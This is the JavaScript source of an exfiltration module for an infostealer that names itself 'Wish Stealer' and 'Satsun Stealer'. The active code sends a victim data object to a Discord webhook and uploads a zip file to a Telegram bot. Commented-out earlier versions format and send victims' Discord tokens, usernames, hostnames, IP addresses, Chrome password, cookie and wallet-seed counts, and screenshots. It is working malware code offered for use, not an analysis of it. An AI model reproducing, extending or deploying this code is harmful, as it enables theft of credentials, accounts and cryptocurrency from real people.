// exfil.js - Upgraded version (JSON + File support)
const fetch = require('node-fetch');
const fs = require('fs/promises');
const FormData = require('form-data');
const { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, DISCORD_WEBHOOK } = require('./config');

const safeFetch = async (url, options, retries = 2) => {
    for (let i = 0; i <= retries; i++) {
        try {
            const res = await fetch(url, options);
            if (res.ok) return res;

            console.log(`[-] Request failed (${res.status}). Attempt ${i + 1}/${retries + 1}`);
            if (i === retries) return res;

            await new Promise(r => setTimeout(r, 1500 * (i + 1)));
        } catch (e) {
            console.log(`[-] Fetch error (attempt ${i + 1})`);
            if (i === retries) throw e;
            await new Promise(r => setTimeout(r, 1500 * (i + 1)));
        }
    }
};

// Send JSON data (main info object)
const sendJSON = async (data) => {
  console.log("WEBHOOK:", DISCORD_WEBHOOK);

  try {
    if (!DISCORD_WEBHOOK || !DISCORD_WEBHOOK.startsWith('http')) {
      throw new Error("Invalid DISCORD_WEBHOOK");
    }

    const res = await safeFetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    return res.ok;
  } catch (e) {
    console.error("[-] Webhook failed:", e.message);
    return false;
  }
};


// Send File (zip, txt, etc.) - Best for Telegram
const sendFile = async (filePath) => {
  console.log("TOKEN:", TELEGRAM_TOKEN);
  console.log("CHAT ID:", TELEGRAM_CHAT_ID);

  try {
    const fileBuffer = await fs.readFile(filePath);

    const form = new FormData();
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('document', fileBuffer, 'output.zip');

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;

    const res = await safeFetch(url, {
      method: 'POST',
      body: form
    });

    return res.ok;
  } catch (e) {
    console.error("[-] File upload failed:", e.message);
    return false;
  }
};

module.exports = {
    sendJSON,
    sendFile,
    sendToWebhook: sendJSON,      // backward compatibility
    sendToTelegram: sendFile      // backward compatibility
};

/**
// exfil.js - Final clean version
const fetch = require('node-fetch');

const safeFetch = async (url, options, retries = 2) => {
    for (let i = 0; i <= retries; i++) {
        try {
            const res = await fetch(url, options);

            if (res.ok) return res;

            console.log(`[-] Request failed (${res.status}). Attempt ${i + 1}/${retries + 1}`);

            if (i === retries) return res;
            await new Promise(r => setTimeout(r, 1500 * (i + 1)));
        } catch (e) {
            console.log(`[-] Fetch error (attempt ${i + 1})`);
            if (i === retries) throw e;
            await new Promise(r => setTimeout(r, 1500 * (i + 1)));
        }
    }
};

const sendToWebhook = async (info) => {
    try {
        const res = await safeFetch(process.env.WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(info)
        });

        return res.ok;
    } catch (e) {
        console.error("[-] Webhook failed:", e.message);
        return false;
    }
};

const sendToTelegram = async (info) => {
    try {
        const res = await safeFetch(process.env.TELEGRAM_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(info)
        });

        return res.ok;
    } catch (e) {
        console.error("[-] Telegram failed:", e.message);
        return false;
    }
};

module.exports = {
    sendToWebhook,
    sendToTelegram
};



// exfil.js — Text-only + safe screenshot base64 (no FormData crash risk)

const fetch = require('node-fetch');

const { DISCORD_WEBHOOK, TELEGRAM_TOKEN, TELEGRAM_CHAT_ID } = require('./config');

async function sendToWebhook(data) {
    console.log("[DEBUG] Sending embed to Discord...");
    const embed = {
        title: "Wish Stealer - New Victim",
        color: 0xFF0000,
        fields: [
            { name: "Time", value: data.time || "Unknown", inline: true },
            { name: "User", value: data.username || "Unknown", inline: true },
            { name: "PC", value: data.hostname || "Unknown", inline: true },
            { name: "IP", value: data.ip || "Unknown", inline: true },
            { name: "Discord Token", value: `\`\`\`${data.token || "Not found"}\`\`\``, inline: false },
            { name: "Found Seeds/Keys", value: data.seeds?.length || 0, inline: true },
            { name: "Chrome Passwords", value: data.passwords?.length || 0, inline: true },
            { name: "Cookies", value: data.cookies?.length || 0, inline: true }
        ],
        footer: { text: "Satsun Stealer" },
        timestamp: data.time
    };

    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
        console.log("[SUCCESS] Discord embed sent");
    } catch (e) {
        console.error("[ERROR] Discord send failed:", e.message);
    }
}

async function sendToTelegram(data) {
    console.log("[DEBUG] Sending text summary to Telegram...");

    const caption = `
Wish Stealer - New Victim
Time: ${data.time || "Unknown"}
User: ${data.username || "Unknown"}
PC: ${data.hostname || "Unknown"}
IP: ${data.ip || "Unknown"}
Discord Token: ${data.token || "Not found"}
Seeds/Keys: ${data.seeds?.length || 0}
Chrome Passwords: ${data.passwords?.length || 0}
Cookies: ${data.cookies?.length || 0}
    `;

    try {
        // 1. Send text summary
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: caption,
                parse_mode: 'Markdown'
            })
        });
        console.log("[SUCCESS] Telegram text summary sent");

        // 2. Send screenshot as base64 text (safe, no FormData/Blob crash)
        if (data.screenshot) {
            const base64Part = data.screenshot.substring(0, 4000); // truncate to avoid message length limit
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: `Victim Screenshot (base64 - decode at https://base64.guru/converter/decode/image):\n${base64Part}... (truncated - full in DB)`
                })
            });
            console.log("[SUCCESS] Screenshot base64 sent as text");
        }
    } catch (e) {
        console.error("[ERROR] Telegram send failed:", e.message);
    }
}

module.exports = { sendToWebhook, sendToTelegram };
*/
